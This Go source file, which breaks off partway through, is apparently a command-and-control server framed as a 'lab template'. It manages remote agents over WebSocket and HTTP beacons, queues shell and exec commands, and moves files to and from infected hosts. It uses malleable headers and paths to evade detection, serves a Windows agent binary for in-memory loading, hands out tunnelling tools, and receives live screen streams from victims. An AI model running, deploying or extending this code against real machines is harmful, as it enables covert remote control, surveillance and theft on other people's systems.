// C2 Server - lab template (WebSocket/TLS + HTTP beacon)
// v1.5.0: auto-generate self-signed TLS certs, embedded defaults, log-to-file, Win GUI mode.
// Havoc P0: job queue, stable agent ID, kill date, split admin/agent tokens.
// Phase 1: shell/exec results, job cancel, state.json persistence.
// Bundle: upload/download + HTTP beacon (B-H6) + admin file helpers.
// v1.4.2: hangame §3-1 game_active / dashboard_led on agent heartbeat.
// v1.4.3: stream_enable gate on admin screenshot/stream enqueue.
// v1.4.4: shell/exec/shell_admin/exec_admin always allowed (never stream-gated).

package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"

	"c2server/ui"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

const serverVersion = "1.7.0-lab-stage"

type Config struct {
	ListenAddr     string
	TLSCert        string
	TLSKey         string
	AgentToken     string
	AdminToken     string
	DataDir        string
	JobQueueMax    int
	KillDate       time.Time
	MaxAgentAge    time.Duration
	CmdTimeoutSec  int
	JobTTL         time.Duration
	PersistState   bool
	FileMaxBytes   int
	FileChunkBytes int
	BeaconPath     string
	BeaconURIs     []string // B-H7: extra beacon paths (csv BEACON_URIS)
	AgentWSPath    string
	// B-H7 malleable response
	ResponseHeaders map[string]string
	// B-H8 app-level AEAD (PSK)
	PSK       string
	CryptoOn  bool
	CryptoKey []byte // sha256(psk material)
	// v1.5.0
	LogFile string
	AutoTLS bool // auto-generate self-signed certs when cert files missing
	// v1.6.0 multi-stage: in-memory stager drop (loader fetches agent here)
	StagePath      string
	StagePayload   string
	StageAuthToken string
	// v1.9.0: directory for agent tool binaries (chisel, etc.)
	ToolsDir string
	// Security hardening
	AllowedOrigins []string
	RateLimitRPS   float64 // per-IP rate limit (requests per second)
}

type Agent struct {
	ID         string    `json:"id"`
	StableID   string    `json:"stable_id,omitempty"`
	Hostname   string    `json:"hostname"`
	Username   string    `json:"username"`
	OS         string    `json:"os"`
	Arch       string    `json:"arch"`
	PID        int       `json:"pid"`
	Version    string    `json:"version"`
	Transport  string    `json:"transport,omitempty"` // wss | http
	RemoteAddr string    `json:"remote_addr,omitempty"`
	FirstSeen  time.Time `json:"first_seen"`
	LastSeen   time.Time `json:"last_seen"`
	Online     bool      `json:"online"`
	QueuedJobs int       `json:"queued_jobs"`
	// Hangame §3-1 presence (from agent heartbeat)
	GameActive   bool   `json:"game_active"`
	GameID       string `json:"game_id,omitempty"`
	GameTitle    string `json:"game_title,omitempty"`
	GamePID      int    `json:"game_pid,omitempty"`
	GameSince    int64  `json:"game_since,omitempty"`
	StreamEnable bool   `json:"stream_enable"`
	DashboardLED string `json:"dashboard_led"` // green | gray
	GameProfile  string `json:"game_profile,omitempty"`
	conn         *websocket.Conn
	mu           sync.Mutex
	pendingQueue []*Job // jobs waiting to send on this session
}

type Job struct {
	ID        string    `json:"id"`
	AgentID   string    `json:"agent_id"`
	CmdType   string    `json:"cmd_type"`
	Payload   string    `json:"payload"`
	Status    string    `json:"status"` // queued|sent|done|failed|cancelled
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
	SentAt    time.Time `json:"sent_at,omitempty"`
	Result    string    `json:"result,omitempty"`
	Error     string    `json:"error,omitempty"`
	ExitCode  *int      `json:"exit_code,omitempty"`
	TimedOut  bool      `json:"timed_out,omitempty"`
	Success   *bool     `json:"success,omitempty"`
}

type persistentState struct {
	SavedAt time.Time      `json:"saved_at"`
	Agents  []persistAgent `json:"agents"`
	Jobs    []*Job         `json:"jobs"`
}

type persistAgent struct {
	ID        string    `json:"id"`
	StableID  string    `json:"stable_id,omitempty"`
	Hostname  string    `json:"hostname"`
	Username  string    `json:"username"`
	OS        string    `json:"os"`
	Arch      string    `json:"arch"`
	PID       int       `json:"pid"`
	Version   string    `json:"version"`
	Transport string    `json:"transport,omitempty"`
	FirstSeen time.Time `json:"first_seen"`
	LastSeen  time.Time `json:"last_seen"`
}

var (
	cfg      Config
	upgrader = websocket.Upgrader{
		CheckOrigin:     checkWebSocketOrigin,
		ReadBufferSize:  64 * 1024,
		WriteBufferSize: 64 * 1024,
	}

	agentsMu sync.RWMutex
	agents   = map[string]*Agent{} // key = agent id (stable)

	jobsMu sync.RWMutex
	jobs   = map[string]*Job{}

	stateMu   sync.Mutex
	persistCh = make(chan struct{}, 1)

	logFile *os.File
	logMu   sync.Mutex

	// live stream frames: agentID -> latest frame envelope
	streamMu     sync.RWMutex
	streamFrames = map[string]*StreamFrame{}
	// H264 fMP4 live stream state (agentID -> init + media segment ring)
	streamInit   = map[string]*StreamInit{}
	streamSegs   = map[string][]*StreamSeg{}
	streamSegMax = 12
	// 이벤트 대기 좌표: 세그 도착 시 close로 롱폴 웨이커 일괄 기상(데이터 없으면 무부하 대기)
	// wakeMu는 streamMu와 별도 락 — 생산자가 streamMu 홀드 중 notify 가능(교착 방지)
	streamWake = map[string]chan struct{}{}
	wakeMu     sync.Mutex
)

// StreamFrame is the latest live frame pushed by an agent (legacy JPEG mode).
type StreamFrame struct {
	AgentID    string    `json:"agent_id"`
	Frame      uint64    `json:"frame"`
	Size       int       `json:"size"`
	MIME       string    `json:"mime,omitempty"`
	SHA256     string    `json:"sha256,omitempty"`
	DataB64    string    `json:"data_b64"`
	ReceivedAt time.Time `json:"received_at"`
}

// StreamInit is the fMP4 init segment (ftyp+moov) for an agent's H264 stream.
// Raw is the single storage format; base64 only appears at the JSON edge
// (legacy agents ingress as data_b64 and are decoded once, legacy admin
// clients are served data_b64 encoded on the fly).
type StreamInit struct {
	AgentID    string
	Stream     int64
	MIME       string
	Codec      string
	Size       int
	Raw        []byte
	Params     []byte // avcC에서 추출한 Annex-B SPS+PPS — WebRTC RTP 인밴드 전달용
	ReceivedAt time.Time
}

// StreamSeg is one fMP4 media segment (moof+mdat) of an agent's H264 stream.
type StreamSeg struct {
	AgentID    string
	Stream     int64
	Seq        int64
	Size       int
	MIME       string
	Raw        []byte
	ReceivedAt time.Time
}

// findBox returns the payload of the first direct child box with the given type.
func findBox(b []byte, typ string) []byte {
	i := 0
	for i+8 <= len(b) {
		sz := int(binary.BigEndian.Uint32(b[i : i+4]))
		if sz == 0 {
			sz = len(b) - i
		}
		if sz < 8 || i+sz > len(b) {
			return nil
		}
		if string(b[i+4:i+8]) == typ {
			return b[i+8 : i+sz]
		}
		i += sz
	}
	return nil
}

// avcCParamSets walks ftyp+moov → trak → mdia → minf → stbl → stsd → first
// sample entry → avcC and returns its SPS/PPS as an Annex-B blob.
// fMP4 init segment은 WebRTC RTP에 안 실리므로 인밴드 주입용으로 추출한다.
// 반환 nil = 조사 실패 (주입 생략 — 안전)
func avcCParamSets(raw []byte) []byte {
	stsd := findBox(findBox(findBox(findBox(findBox(findBox(raw, "moov"), "trak"), "mdia"), "minf"), "stbl"), "stsd")
	if stsd == nil || len(stsd) < 8+86 {
		return nil
	}
	entries := stsd[8:] // version/flags(4)+entry_count(4)
	entrySize := int(binary.BigEndian.Uint32(entries[0:4]))
	if entrySize < 86 || entrySize > len(entries) {
		return nil
	}
	avcc := findBox(entries[86:entrySize], "avcC") // size(4)+type(4)+sampleEntry(78)
	if avcc == nil || len(avcc) < 7 {
		return nil
	}
	p := 5
	numSPS := int(avcc[p] & 0x1f)
	p++
	var out []byte
	for i := 0; i < numSPS; i++ {
		if p+2 > len(avcc) {
			return nil
		}
		l := int(binary.BigEndian.Uint16(avcc[p : p+2]))
		p += 2
		if l <= 0 || p+l > len(avcc) {
			return nil
		}
		out = append(out, 0, 0, 0, 1)
		out = append(out, avcc[p:p+l]...)
		p += l
	}
	if p >= len(avcc) {
		return nil
	}
	numPPS := int(avcc[p])
	p++
	for i := 0; i < numPPS; i++ {
		if p+2 > len(avcc) {
			return nil
		}
		l := int(binary.BigEndian.Uint16(avcc[p : p+2]))
		p += 2
		if l <= 0 || p+l > len(avcc) {
			return nil
		}
		out = append(out, 0, 0, 0, 1)
		out = append(out, avcc[p:p+l]...)
		p += l
	}
	if len(out) == 0 {
		return nil
	}
	return out
}

func logPrintf(format string, v ...interface{}) {
	msg := fmt.Sprintf(format, v...)
	logMu.Lock()
	if logFile != nil {
		_, _ = fmt.Fprintln(logFile, msg)
	}
	logMu.Unlock()
	log.Print(msg)
}

func main() {
	cfg = loadConfig()

	// v1.5.0: validate tokens are configured
	if cfg.AgentToken == "" {
		log.Fatalf("AGENT_TOKEN is empty — server would reject all agents; set AGENT_TOKEN or AUTH_TOKEN in env")
	}
	if cfg.AdminToken == "" {
		log.Fatalf("ADMIN_TOKEN is empty — no admin access; set ADMIN_TOKEN in env")
	}

	// v1.5.0: auto-generate self-signed TLS certs
	if cfg.AutoTLS {
		if err := ensureTLSCerts(cfg.TLSCert, cfg.TLSKey); err != nil {
			log.Fatalf("auto-tls: %v", err)
		}
	}

	if err := os.MkdirAll(cfg.DataDir, 0o755); err != nil {
		log.Fatalf("data dir: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(cfg.DataDir, "files"), 0o755); err != nil {
		log.Fatalf("files dir: %v", err)
	}

	// v1.5.0: open log file
	if cfg.LogFile != "" {
		absLog := cfg.LogFile
		if !filepath.IsAbs(absLog) {
			absLog = filepath.Join(cfg.DataDir, absLog)
		}
		_ = os.MkdirAll(filepath.Dir(absLog), 0o755)
		f, err := os.OpenFile(absLog, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
		if err == nil {
			logFile = f
			logPrintf("c2server %s logging to %s", serverVersion, absLog)
		} else {
			log.Printf("warning: cannot open log file %s: %v", absLog, err)
		}
		defer func() {
			if logFile != nil {
				logFile.Close()
			}
		}()
	}

	loadState()
	if cfg.PersistState {
		go persistLoop()
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/health", requireAdmin(handleHealth))
	// B-H7: register all WS / beacon URIs
	wsPaths := uniquePaths(append([]string{cfg.AgentWSPath, "/agent"}, parseCSVPaths(env("AGENT_WS_PATHS", ""))...))
	for _, p := range wsPaths {
		if p == "" {
			continue
		}
		mux.HandleFunc(p, handleAgentWS)
	}
	for _, p := range uniquePaths(cfg.BeaconURIs) {
		if p == "" {
			continue
		}
		mux.HandleFunc(p, handleBeacon)
	}
	// always keep /beacon as alias
	if !containsPath(cfg.BeaconURIs, "/beacon") {
		mux.HandleFunc("/beacon", handleBeacon)
	}
	mux.HandleFunc("/admin/agents", requireAdmin(handleAdminAgents))
	mux.HandleFunc("/admin", requireAdmin(handleAdminAgents))
	mux.HandleFunc("/admin/cmd", requireAdmin(handleAdminCmd))
	mux.HandleFunc("/cmd", requireAdmin(handleAdminCmd))
	mux.HandleFunc("/admin/jobs", requireAdmin(handleAdminJobs))
	mux.HandleFunc("/admin/jobs/cancel", requireAdmin(handleAdminCancel))
	mux.HandleFunc("/admin/upload", requireAdmin(handleAdminUpload))
	mux.HandleFunc("/admin/download", requireAdmin(handleAdminDownload))
	mux.HandleFunc("/admin/stream", requireAdmin(handleAdminStream))
	mux.HandleFunc("/admin/wsstream", requireAdmin(handleAdminWSStream))
	mux.HandleFunc("/admin/webrtc/offer", requireAdmin(handleAdminWebRTCOffer))

	mux.HandleFunc("/admin/file", requireAdmin(handleAdminFileGet))
	// v1.6.0 multi-stage: loader fetches raw agent PE for in-memory run
	mux.HandleFunc(cfg.StagePath, handleStage)

	// v1.9.0: serve tool binaries (chisel, etc.) for agent download
	toolsDir := "./tools"
	if cfg.ToolsDir != "" {
		toolsDir = cfg.ToolsDir
	}
	toolsHandler := http.StripPrefix("/tools/", http.FileServer(http.Dir(toolsDir)))
	mux.Handle("/tools/", requireAdmin(toolsHandler.ServeHTTP))

	// DocViewer admin console (static, same-origin). Catch-all "/" so the SPA
	// is served at the root while specific routes (health/admin/ws/beacon)
	// still win on pattern precedence. Token-gated on the client side.
	mux.Handle("/", http.FileServer(http.FS(ui.FS())))

	// v1.5.0: log all listening paths
	logPrintf("c2server %s listen=%s ws=%v beacon=%v crypto=%v data=%s",
		serverVersion, addr(), wsPaths, cfg.BeaconURIs, cfg.CryptoOn, cfg.DataDir)

	// B-H7: wrap all responses with malleable headers + rate limiting
	var handler http.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		applyResponseHeaders(w)
		mux.ServeHTTP(w, r)
	})
	handler = rateLimitMiddleware(handler)

	if cfg.TLSCert != "" && cfg.TLSKey != "" {
		// TLS 1.2+
		srv := &http.Server{
			Addr:    addr(),
			Handler: handler,
			TLSConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		}
		logPrintf("c2server TLS: %s / %s", cfg.TLSCert, cfg.TLSKey)
		log.Fatal(srv.ListenAndServeTLS(cfg.TLSCert, cfg.TLSKey))
	}
	logPrintf("c2server PLAIN (no TLS)")
	log.Fatal(http.ListenAndServe(addr(), handler))
}

func addr() string {
	return cfg.ListenAddr
}

// checkWebSocketOrigin validates WebSocket Origin header.
// Allows empty origin (non-browser clients like native agents).
// When Origin is present, validates against:
//   - loopback hosts (localhost, 127.0.0.1, ::1)
//   - the host the browser is actually connected to (self-reference via
//     r.Host, e.g. operating the viewer at https://IP:8443)
//   - the configured allowed origins list (Host field always stripped
//     of scheme and port before comparison)
func checkWebSocketOrigin(r *http.Request) bool {
	origin := r.Header.Get("Origin")
	if origin == "" {
		return true // non-browser clients (native agents)
	}
	oh := originHostPort(origin)
	if oh == "" || oh == "null" {
		logPrintf("WS origin rejected: %q (remote=%s)", origin, r.RemoteAddr)
		return false
	}
	switch oh {
	case "localhost", "127.0.0.1", "[::1]", "::1":
		return true
	}
	// Self-reference: origin host vs the Host header the browser sent.
	if reqHost := originHostPort("https://" + r.Host); reqHost != "" && oh == reqHost {
		return true
	}
	// Configured listen address when it names a host (":8443" yields "").
	if lh := originHostPort("https://" + cfg.ListenAddr); lh != "" && oh == lh {
		return true
	}
	// Check allowed origins list (normalize similarly for tolerance).
	for _, allowed := range cfg.AllowedOrigins {
		if allowed == "*" || oh == originHostPort(allowed) {
			return true
		}
	}
	logPrintf("WS origin rejected: %s (host=%s remote=%s)", origin, oh, r.RemoteAddr)
	return false
}

// originHostPort trims the scheme, trailing slash and port so host
// comparisons operate on bare host names (bracketed IPv6 keeps brackets).
func originHostPort(v string) string {
	v = strings.TrimSpace(v)
	v = strings.TrimPrefix(v, "https://")
	v = strings.TrimPrefix(v, "http://")
	v = strings.TrimSuffix(v, "/")
	if strings.Contains(v, "::") && !strings.HasPrefix(v, "[") {
		return v // bare IPv6 literal: leave as-is
	}
	if i := strings.LastIndex(v, ":"); i != -1 && !strings.Contains(v[i:], "]") {
		v = v[:i]
	}
	return v
}

// ---------- Per-IP rate limiter ----------
type ipRateLimiter struct {
	mu       sync.Mutex
	visitors map[string]*rateBucket
}

type rateBucket struct {
	tokens    float64
	lastCheck time.Time
}

var globalRateLimiter = &ipRateLimiter{visitors: map[string]*rateBucket{}}

func (rl *ipRateLimiter) allow(ip string, rps float64, burst int) bool {
	if rps <= 0 {
		return true // rate limiting disabled
	}
	rl.mu.Lock()
	defer rl.mu.Unlock()
	b, ok := rl.visitors[ip]
	now := time.Now()
	if !ok {
		b = &rateBucket{tokens: float64(burst), lastCheck: now}
		rl.visitors[ip] = b
	}
	elapsed := now.Sub(b.lastCheck).Seconds()
	b.tokens += elapsed * rps
	if b.tokens > float64(burst) {
		b.tokens = float64(burst)
	}
	b.lastCheck = now
	if b.tokens < 1 {
		return false
	}
	b.tokens--
	return true
}

// rateLimitMiddleware wraps an http.Handler with per-IP rate limiting.
// Returns 429 when limit exceeded.
func rateLimitMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if cfg.RateLimitRPS > 0 {
			ip := r.RemoteAddr
			if idx := strings.LastIndex(ip, ":"); idx >= 0 {
				ip = ip[:idx]
			}
			if !globalRateLimiter.allow(ip, cfg.RateLimitRPS, int(cfg.RateLimitRPS)*2) {
				w.Header().Set("Retry-After", "1")
				http.Error(w, "too many requests", http.StatusTooManyRequests)
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}

// v1.5.0: auto-generate self-signed RSA 2048 cert + key
func ensureTLSCerts(certPath, keyPath string) error {
	// Check if both exist already
	if _, err := os.Stat(certPath); err == nil {
		if _, err := os.Stat(keyPath); err == nil {
			logPrintf("tls certs exist: %s, %s", certPath, keyPath)
			return nil // both exist
		}
	}
	logPrintf("generating self-signed TLS cert -> %s, %s", certPath, keyPath)

	// Generate RSA key
	privateKey, err := rsa.GenerateKey(crand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}

	// Create cert template
	serialNumber, _ := crand.Int(crand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	// Parse listen addr to include actual IP in cert SANs
	dnsNames := []string{"localhost", "127.0.0.1"}
	ipAddresses := []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("0.0.0.0")}
	if host := strings.Split(cfg.ListenAddr, ":")[0]; host != "" && host != "0.0.0.0" {
		if ip := net.ParseIP(host); ip != nil {
			ipAddresses = append(ipAddresses, ip)
			dnsNames = append(dnsNames, host)
		} else {
			dnsNames = append(dnsNames, host)
		}
	}
	template := &x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization: []string{"DocView Soft"},
			CommonName:   "localhost",
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(10 * 365 * 24 * time.Hour), // 10 years
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              dnsNames,
		IPAddresses:           ipAddresses,
	}

	// Self-sign
	derBytes, err := x509.CreateCertificate(crand.Reader, template, template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("create cert: %w", err)
	}

	// Ensure directory exists
	_ = os.MkdirAll(filepath.Dir(certPath), 0o755)
	_ = os.MkdirAll(filepath.Dir(keyPath), 0o755)

	// Write cert PEM
	certFile, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer certFile.Close()
	if err := pemEncodeCert(certFile, derBytes); err != nil {
		return fmt.Errorf("write cert: %w", err)
	}

	// Write key PEM
	keyFile, err := os.Create(keyPath)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer keyFile.Close()
	if err := pemEncodeKey(keyFile, privateKey); err != nil {
		return fmt.Errorf("write key: %w", err)
	}

	logPrintf("self-signed cert generated: %s, %s", certPath, keyPath)
	return nil
}

// Minimal PEM encoders (avoid importing encoding/pem for a few lines)
func pemEncodeCert(w io.Writer, der []byte) error {
	const hdr = "-----BEGIN CERTIFICATE-----\n"
	const ftr = "\n-----END CERTIFICATE-----\n"
	if _, err := io.WriteString(w, hdr); err != nil {
		return err
	}
	b64 := base64.StdEncoding.EncodeToString(der)
	for i := 0; i < len(b64); i += 64 {
		end := i + 64
		if end > len(b64) {
			end = len(b64)
		}
		if _, err := io.WriteString(w, b64[i:end]+"\n"); err != nil {
			return err
		}
	}
	_, err := io.WriteString(w, ftr)
	return err
}

func pemEncodeKey(w io.Writer, key *rsa.PrivateKey) error {
	der := x509.MarshalPKCS1PrivateKey(key)
	const hdr = "-----BEGIN RSA PRIVATE KEY-----\n"
	const ftr = "\n-----END RSA PRIVATE KEY-----\n"
	if _, err := io.WriteString(w, hdr); err != nil {
		return err
	}
	b64 := base64.StdEncoding.EncodeToString(der)
	for i := 0; i < len(b64); i += 64 {
		end := i + 64
		if end > len(b64) {
			end = len(b64)
		}
		if _, err := io.WriteString(w, b64[i:end]+"\n"); err != nil {
			return err
		}
	}
	_, err := io.WriteString(w, ftr)
	return err
}

func loadConfig() Config {
	c := Config{
		ListenAddr:     env("C2_LISTEN_ADDR", "0.0.0.0:8443"),
		TLSCert:        env("TLS_CERT_PATH", "./certs/server.crt"),
		TLSKey:         env("TLS_KEY_PATH", "./certs/server.key"),
		AgentToken:     firstNonEmpty(env("AGENT_TOKEN", ""), env("AUTH_TOKEN", "")),
		AdminToken:     env("ADMIN_TOKEN", ""),
		DataDir:        env("DATA_DIR", "./data"),
		JobQueueMax:    envInt("JOB_QUEUE_MAX", 64),
		CmdTimeoutSec:  envInt("CMD_TIMEOUT_SEC", 30),
		JobTTL:         envDur("JOB_TTL", 24*time.Hour),
		PersistState:   env("PERSIST_STATE", "1") != "0",
		FileMaxBytes:   envInt("FILE_MAX_BYTES", 5*1024*1024),
		FileChunkBytes: envInt("FILE_CHUNK_BYTES", 256*1024),
		BeaconPath:     env("BEACON_PATH", "/beacon"),
		AgentWSPath:    env("AGENT_WS_PATH", "/agent"),
		MaxAgentAge:    envDur("MAX_AGENT_AGE", 0),
		PSK:            firstNonEmpty(env("C2_PSK", ""), env("APP_PSK", "")),
		// v1.5.0
		LogFile: env("C2_LOG_FILE", "log.txt"),
		AutoTLS: env("C2_AUTO_TLS", "1") != "0",
		// v1.6.0 multi-stage: in-memory stager drop (loader fetches agent here)
		StagePath:      env("C2_STAGE_PATH", "/stage/agent"),
		StagePayload:   env("STAGE_PAYLOAD_PATH", "./bin/agent_win_amd64.exe"),
		StageAuthToken: env("STAGE_AUTH_TOKEN", ""),
		// Security hardening
		AllowedOrigins: parseCSVHosts(env("C2_ALLOWED_ORIGINS", "")),
		RateLimitRPS:   envFloat("C2_RATE_LIMIT_RPS", 10),
	}
	// B-H7 URI list
	c.BeaconURIs = parseCSVPaths(env("BEACON_URIS", ""))
	if c.BeaconPath != "" && !containsPath(c.BeaconURIs, c.BeaconPath) {
		// primary first
		c.BeaconURIs = append([]string{c.BeaconPath}, c.BeaconURIs...)
	}
	if len(c.BeaconURIs) == 0 {
		c.BeaconURIs = []string{"/beacon"}
		c.BeaconPath = "/beacon"
	} else {
		c.BeaconPath = c.BeaconURIs[0]
	}
	c.ResponseHeaders = parseHeaderKV(env("RESPONSE_HEADERS", env("BEACON_RESPONSE_HEADERS", "")))
	// B-H8
	if c.PSK != "" && env("C2_CRYPTO", "1") != "0" {
		c.CryptoOn = true
		c.CryptoKey = derivePSKKey(c.PSK)
	}
	if kd := strings.TrimSpace(env("KILL_DATE", "")); kd != "" {
		if t, err := time.Parse(time.RFC3339, kd); err == nil {
			c.KillDate = t.UTC()
		} else if t, err := time.Parse("2006-01-02", kd); err == nil {
			c.KillDate = t.UTC().Add(24*time.Hour - time.Second)
		}
	}
	if c.JobQueueMax <= 0 {
		c.JobQueueMax = 64
	}
	if c.FileMaxBytes <= 0 {
		c.FileMaxBytes = 5 * 1024 * 1024
	}
	if c.FileChunkBytes <= 0 {
		c.FileChunkBytes = 256 * 1024
	}
	return c
}

func env(k, d string) string {
	if v := os.Getenv(k); v != "" {
		if strings.HasPrefix(v, "{{") && strings.HasSuffix(v, "}}") {
			return d
		}
		return v
	}
	return d
}

func envInt(k string, d int) int {
	v := strings.TrimSpace(env(k, ""))
	if v == "" {
		return d
	}
	n, err := strconv.Atoi(v)
	if err != nil {
		return d
	}
	return n
}

func envDur(k string, d time.Duration) time.Duration {
	v := strings.TrimSpace(env(k, ""))
	if v == "" {
		return d
	}
	x, err := time.ParseDuration(v)
	if err != nil {
		return d
	}
	return x
}

func envFloat(k string, d float64) float64 {
	v := strings.TrimSpace(env(k, ""))
	if v == "" {
		return d
	}
	n, err := strconv.ParseFloat(v, 64)
	if err != nil {
		return d
	}
	return n
}

func firstNonEmpty(a, b string) string {
	if strings.TrimSpace(a) != "" {
		return a
	}
	return b
}

func killDateUnix() int64 {
	if cfg.KillDate.IsZero() {
		return 0
	}
	return cfg.KillDate.Unix()
}

func killDatePassed() bool {
	return !cfg.KillDate.IsZero() && time.Now().UTC().After(cfg.KillDate)
}

func maxAgeSec() int64 {
	if cfg.MaxAgentAge <= 0 {
		return 0
	}
	return int64(cfg.MaxAgentAge.Seconds())
}

func tokenOK(got, want string) bool {
	return got != "" && subtleConstantTimeEq(got, want)
}

func subtleConstantTimeEq(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	var v byte
	for i := 0; i < len(a); i++ {
		v |= a[i] ^ b[i]
	}
	return v == 0
}

func extractToken(r *http.Request) string {
	if t := r.Header.Get("X-Auth-Token"); t != "" {
		return t
	}
	if ah := r.Header.Get("Authorization"); strings.HasPrefix(strings.ToLower(ah), "bearer ") {
		return strings.TrimSpace(ah[7:])
	}
	// Browsers cannot set custom headers on a WebSocket handshake, so the
	// viewer leg (/admin/wsstream) passes the token as a query param.
	if t := r.URL.Query().Get("token"); t != "" {
		return t
	}
	return ""
}

func requireAdmin(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !tokenOK(extractToken(r), cfg.AdminToken) {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func handleHealth(w http.ResponseWriter, r *http.Request) {
	agentsMu.RLock()
	nAgents := len(agents)
	online := 0
	for _, a := range agents {
		if a.Online {
			online++
		}
	}
	agentsMu.RUnlock()
	jobsMu.RLock()
	nJobs := len(jobs)
	jobsMu.RUnlock()
	writeJSON(w, 200, map[string]interface{}{
		"status":      "ok",
		"server_ver":  serverVersion,
		"agents":      nAgents,
		"online":      online,
		"jobs":        nJobs,
		"persist":     cfg.PersistState,
		"kill_date":   killDateUnix(),
		"file_max":    cfg.FileMaxBytes,
		"beacon_path": cfg.BeaconPath,
		"beacon_uris": cfg.BeaconURIs,
		"agent_ws":    cfg.AgentWSPath,
		"transports":  []string{"wss", "http"},
		"crypto":      cfg.CryptoOn,
		"malleable":   true,
	})
}

// ---------- Multi-stage stager drop ----------
// v1.6.0: serves the raw Windows agent PE to the loader so the loader can
// run it entirely in memory (no agent.exe ever touches disk). Auth optional
// (STAGE_AUTH_TOKEN); path is malleable via C2_STAGE_PATH.

func handleStage(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	stageWant := cfg.StageAuthToken
	if stageWant == "" {
		stageWant = cfg.AdminToken
	}
	if !tokenOK(extractToken(r), stageWant) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	// Only serve the configured stage payload path (no query param override)
	path := cfg.StagePayload
	data, err := os.ReadFile(path)
	if err != nil {
		http.Error(w, "payload unavailable", http.StatusNotFound)
		logPrintf("stage: payload read failed %s: %v", path, err)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(200)
	_, _ = w.Write(data)
	logPrintf("stage: served %d bytes from %s", len(data), path)
}

// ---------- WebSocket agent ----------

func handleAgentWS(w http.ResponseWriter, r *http.Request) {
	if !tokenOK(extractToken(r), cfg.AgentToken) {
		logPrintf("WS auth fail remote=%s tok=%q", r.RemoteAddr, extractToken(r))
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	if killDatePassed() {
		http.Error(w, "gone", http.StatusGone)
		return
	}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		logPrintf("ws upgrade: %v", err)
		return
	}
	defer conn.Close()

	// Server-driven keepalive (fix for repeated WS drops): ping the peer every
	// pingPeriod; a healthy peer (websocket-client auto-responds to ping) answers
	// with a pong, which refreshes the read deadline. A dead peer fails the
	// pong-wait deadline and is dropped. This replaces the previous fixed
	// 3-minute read deadline, which silently killed any client whose application
	// heartbeat stalled for >3min (stream_frame push froze until re-register).
	const (
		writeWait  = 10 * time.Second
		pongWait   = 60 * time.Second
		pingPeriod = 30 * time.Second
	)
	_ = conn.SetReadDeadline(time.Now().Add(pongWait))
	conn.SetPongHandler(func(string) error {
		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})
	pingDone := make(chan struct{})
	defer close(pingDone)
	var writeMu sync.Mutex
	writeLocked := func(fn func() error) error {
		writeMu.Lock()
		defer writeMu.Unlock()
		return fn()
	}
	go func() {
		t := time.NewTicker(pingPeriod)
		defer t.Stop()
		for {
			select {
			case <-t.C:
				_ = writeLocked(func() error {
					return conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait))
				})
			case <-pingDone:
				return
			}
		}
	}()

	var reg map[string]interface{}
	_ = conn.SetReadDeadline(time.Now().Add(15 * time.Second))
	if err := wsReadMsg(conn, &reg); err != nil {
		logPrintf("WS register-read fail remote=%s: %v", r.RemoteAddr, err)
		return
	}
	if asString(reg["type"]) != "register" {
		_ = wsWriteMsg(conn, map[string]string{"type": "error", "error": "expected register"})
		return
	}
	agent, err := upsertAgentFromRegister(reg, "wss", r.RemoteAddr, conn)
	if err != nil {
		logPrintf("WS register fail remote=%s id=%q err=%v", r.RemoteAddr, asString(reg["agent_id"]), err)
		_ = wsWriteMsg(conn, map[string]string{"type": "error", "error": err.Error()})
		return
	}
	logPrintf("WS registered remote=%s id=%s online", r.RemoteAddr, agent.ID)

	// ECDH session-key establishment. The register message carries the agent's
	// ephemeral public key (plaintext inside the PSK-sealed envelope). We
	// derive the per-connection session key now, return OUR ephemeral public
	// key in the reply, and seal the reply with the PSK (the agent does not yet
	// know the session key). We switch to the session key only AFTER the reply
	// is written, so every subsequent frame is session-keyed.
	var sessionKey []byte
	var serverPubB64 string
